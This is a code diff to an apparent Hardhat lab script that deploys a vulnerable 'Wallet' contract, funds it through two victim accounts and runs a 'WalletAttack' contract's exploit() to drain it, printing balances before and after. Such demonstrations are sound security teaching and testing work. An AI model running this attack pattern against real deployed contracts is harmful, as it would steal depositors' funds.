@@ -3,7 +3,7 @@ const ethers = hre.ethers;
 
 async function main() {
   // Get accounts
-  const [owner, attacker] = await ethers.getSigners();
+  const [owner, attacker, victim1, victim2] = await ethers.getSigners();
 
   // Deploy Vulnerable Wallet
   const Wallet = await ethers.getContractFactory("Wallet");
@@ -13,42 +13,38 @@ async function main() {
 
   // Deploy Attack Contract
   const WalletAttack = await ethers.getContractFactory("WalletAttack");
-  const walletAttack = await WalletAttack.connect(attacker).deploy(walletAddress);
+  const walletAttack = await WalletAttack.connect(attacker).deploy();
   await walletAttack.waitForDeployment();
   const attackContractAddress = await walletAttack.getAddress();
 
-  // Deposit 4 ether to the vulnerable wallet
-  const depositAmount = ethers.parseEther("4.0");
-  await wallet.connect(owner).deposit({ value: depositAmount });
+  // Victims deposit funds (4 ETH total)
+  console.log("\nVictims depositing funds...");
+  await wallet.connect(victim1).deposit({ value: ethers.parseEther("2.0") });
+  await wallet.connect(victim2).deposit({ value: ethers.parseEther("2.0") });
 
-  console.log("Initial Wallet Balance:", 
-    ethers.formatEther(await ethers.provider.getBalance(walletAddress)), "ETH");
-  console.log("Attack Contract Balance:", 
-    ethers.formatEther(await ethers.provider.getBalance(attackContractAddress)), "ETH");
-
-  // Perform the attack
-  const attackTx = await walletAttack.connect(attacker).attack({ value: ethers.parseEther("1.0") });
-  await attackTx.wait();
-
-  console.log("\nAfter Attack:");
+  console.log("Initial State:");
   console.log("Wallet Balance:", 
     ethers.formatEther(await ethers.provider.getBalance(walletAddress)), "ETH");
-  console.log("Attack Contract Balance:", 
-    ethers.formatEther(await ethers.provider.getBalance(attackContractAddress)), "ETH");
+  console.log("Attacker Balance:", 
+    ethers.formatEther(await ethers.provider.getBalance(attacker.address)), "ETH");
 
-  // Withdraw stolen funds
-  const withdrawTx = await walletAttack.connect(attacker).withdraw();
-  await withdrawTx.wait();
+  console.log("\nPerforming attack...");
+  // Perform the attack with 1 ETH
+  const attackTx = await walletAttack.connect(attacker).exploit(walletAddress, { 
+    value: ethers.parseEther("1.0") 
+  });
+  await attackTx.wait();
 
-  console.log("\nAfter Withdrawal:");
-  console.log("Attack Contract Balance:", 
-    ethers.formatEther(await ethers.provider.getBalance(attackContractAddress)), "ETH");
+  console.log("\nFinal State:");
+  console.log("Wallet Balance:", 
+    ethers.formatEther(await ethers.provider.getBalance(walletAddress)), "ETH");
+  console.log("Attacker Balance:", 
+    ethers.formatEther(await ethers.provider.getBalance(attacker.address)), "ETH");
 }
 
-// Recommended pattern to handle errors in async functions
-main()
-  .then(() => process.exit(0))
-  .catch((error) => {
-    console.error(error);
-    process.exit(1);
-  });
+// We recommend this pattern to be able to use async/await everywhere
+// and properly handle errors.
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
